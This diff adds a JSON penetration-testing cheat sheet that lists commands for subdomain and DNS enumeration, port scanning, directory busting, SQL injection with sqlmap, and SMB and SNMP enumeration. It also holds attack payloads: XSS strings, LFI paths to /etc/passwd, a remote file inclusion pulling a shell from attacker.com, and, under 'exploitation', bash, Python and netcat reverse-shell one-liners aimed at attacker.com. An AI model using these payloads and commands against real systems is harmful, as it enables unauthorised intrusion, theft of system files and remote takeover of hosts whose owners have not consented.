@@ -1,0 +1,228 @@
+{
+  "web_reconnaissance": {
+    "title": "Web Reconnaissance",
+    "techniques": [
+      {
+        "name": "Subdomain Enumeration",
+        "tools": ["crt.sh", "dnsdumpster", "subfinder", "amass", "assetfinder"],
+        "commands": [
+          "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq .",
+          "subfinder -d example.com -o subdomains.txt",
+          "amass enum -d example.com"
+        ],
+        "description": "Find all subdomains associated with a target domain"
+      },
+      {
+        "name": "DNS Enumeration",
+        "tools": ["dig", "nslookup", "host", "dnsenum"],
+        "commands": [
+          "dig example.com",
+          "dig example.com +trace",
+          "dig axfr @ns1.example.com example.com",
+          "nslookup -type=MX example.com",
+          "host -t TXT example.com"
+        ],
+        "description": "Perform DNS lookups and zone transfers"
+      },
+      {
+        "name": "WHOIS Lookup",
+        "tools": ["whois", "whois.com"],
+        "commands": [
+          "whois example.com",
+          "whois 192.168.1.1"
+        ],
+        "description": "Get registrar and ownership information"
+      },
+      {
+        "name": "Web Server Fingerprinting",
+        "tools": ["curl", "whatweb", "whatweb", "httprint"],
+        "commands": [
+          "curl -I example.com",
+          "curl -I -H 'User-Agent: Mozilla' example.com",
+          "whatweb example.com",
+          "curl -v example.com 2>&1 | grep -i server"
+        ],
+        "description": "Identify web server version and technologies"
+      },
+      {
+        "name": "IP Reputation",
+        "tools": ["shodan", "censys", "abuseipdb"],
+        "commands": [
+          "curl 'https://api.shodan.io/shodan/host/192.168.1.1?key=YOUR_API_KEY'",
+          "Check IP on abuseipdb.com"
+        ],
+        "description": "Check IP reputation and historical data"
+      }
+    ]
+  },
+  "web_scanning": {
+    "title": "Web Application Scanning",
+    "techniques": [
+      {
+        "name": "Directory Busting",
+        "tools": ["gobuster", "dirsearch", "ffuf", "nikto"],
+        "commands": [
+          "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
+          "dirsearch -u http://example.com -e php,txt,html",
+          "ffuf -u http://example.com/FUZZ -w wordlist.txt",
+          "nikto -h http://example.com"
+        ],
+        "description": "Find hidden directories and files on web server"
+      },
+      {
+        "name": "Parameter Fuzzing",
+        "tools": ["ffuf", "paramspider", "arjun"],
+        "commands": [
+          "ffuf -u 'http://example.com/?FUZZ=test' -w params.txt",
+          "paramspider -d example.com",
+          "arjun -u http://example.com"
+        ],
+        "description": "Find hidden parameters in web applications"
+      },
+      {
+        "name": "SQL Injection Testing",
+        "tools": ["sqlmap", "burp"],
+        "commands": [
+          "sqlmap -u 'http://example.com/page.php?id=1' --dbs",
+          "sqlmap -u 'http://example.com/login' --data='user=admin&pass=1' -p pass --dbs",
+          "sqlmap -u 'http://example.com/page?id=1' --os-shell"
+        ],
+        "description": "Test for SQL injection vulnerabilities"
+      },
+      {
+        "name": "XSS Testing",
+        "tools": ["burp", "zap", "xsstrike"],
+        "commands": [
+          "Test payloads: <script>alert('XSS')</script>",
+          "Test payloads: '; alert('XSS'); //",
+          "Test payloads: <img src=x onerror=alert('XSS')>"
+        ],
+        "description": "Test for Cross-Site Scripting vulnerabilities"
+      },
+      {
+        "name": "LFI/RFI Testing",
+        "tools": ["burp", "manual testing"],
+        "commands": [
+          "Test LFI: ?file=../../../../etc/passwd",
+          "Test LFI: ?page=....//....//....//etc/passwd",
+          "Test RFI: ?file=http://attacker.com/shell.php"
+        ],
+        "description": "Test for Local/Remote File Inclusion vulnerabilities"
+      }
+    ]
+  },
+  "os_enumeration": {
+    "title": "OS & Network Enumeration",
+    "techniques": [
+      {
+        "name": "Port Scanning",
+        "tools": ["nmap", "masscan", "zmap"],
+        "commands": [
+          "nmap -p- 192.168.1.1",
+          "nmap -sV -p- 192.168.1.1",
+          "nmap -A -p- 192.168.1.1",
+          "nmap -p 1-1000 --top-ports 192.168.1.1",
+          "masscan -p1-65535 192.168.1.1 --max-rate=1000"
+        ],
+        "description": "Scan for open ports on target system"
+      },
+      {
+        "name": "OS Detection",
+        "tools": ["nmap", "p0f"],
+        "commands": [
+          "nmap -O 192.168.1.1",
+          "nmap -O --osscan-guess 192.168.1.1",
+          "p0f -i eth0"
+        ],
+        "description": "Identify operating system of target"
+      },
+      {
+        "name": "Service Enumeration",
+        "tools": ["nmap", "nc", "telnet"],
+        "commands": [
+          "nmap -sV -p 22,80,443 192.168.1.1",
+          "nc -zv 192.168.1.1 1-1000",
+          "telnet 192.168.1.1 22"
+        ],
+        "description": "Identify services running on open ports"
+      },
+      {
+        "name": "SMB Enumeration",
+        "tools": ["enum4linux", "smbclient", "crackmapexec"],
+        "commands": [
+          "enum4linux 192.168.1.1",
+          "smbclient -L //192.168.1.1",
+          "crackmapexec smb 192.168.1.1"
+        ],
+        "description": "Enumerate SMB shares and users"
+      },
+      {
+        "name": "SNMP Enumeration",
+        "tools": ["snmp-check", "onesixtyone"],
+        "commands": [
+          "snmp-check 192.168.1.1",
+          "onesixtyone 192.168.1.1 public"
+        ],
+        "description": "Enumerate SNMP information"
+      }
+    ]
+  },
+  "vulnerability_assessment": {
+    "title": "Vulnerability Assessment",
+    "techniques": [
+      {
+        "name": "Web Vulnerability Scanning",
+        "tools": ["nikto", "nessus", "openvas"],
+        "commands": [
+          "nikto -h http://example.com",
+          "nikto -h http://example.com -p 8080",
+          "nikto -h http://example.com -Plugins tests"
+        ],
+        "description": "Scan web applications for known vulnerabilities"
+      },
+      {
+        "name": "Network Vulnerability Scanning",
+        "tools": ["nessus", "openvas", "qualys"],
+        "commands": [
+          "openvas --listen 0.0.0.0 --port 9392"
+        ],
+        "description": "Scan network for vulnerabilities"
+      },
+      {
+        "name": "SSL/TLS Analysis",
+        "tools": ["testssl.sh", "sslscan", "nmap"],
+        "commands": [
+          "testssl.sh https://example.com",
+          "sslscan example.com",
+          "nmap --script ssl-enum-ciphers -p 443 example.com"
+        ],
+        "description": "Analyze SSL/TLS configuration"
+      }
+    ]
+  },
+  "exploitation": {
+    "title": "Exploitation Techniques",
+    "techniques": [
+      {
+        "name": "Reverse Shell",
+        "payloads": [
+          "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+          "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"sh\",\"-i\"])'",
+          "nc attacker.com 4444 -e /bin/sh"
+        ],
+        "description": "Establish reverse shell connection"
+      },
+      {
+        "name": "Common Exploits",
+        "vulnerabilities": [
+          "CVE-2021-44228: Log4Shell",
+          "CVE-2021-3129: Laravel RCE",
+          "CVE-2021-21985: vCenter RCE",
+          "CVE-2021-2109: WebLogic RCE"
+        ],
+        "description": "Known critical vulnerabilities"
+      }
+    ]
+  }
+}
+
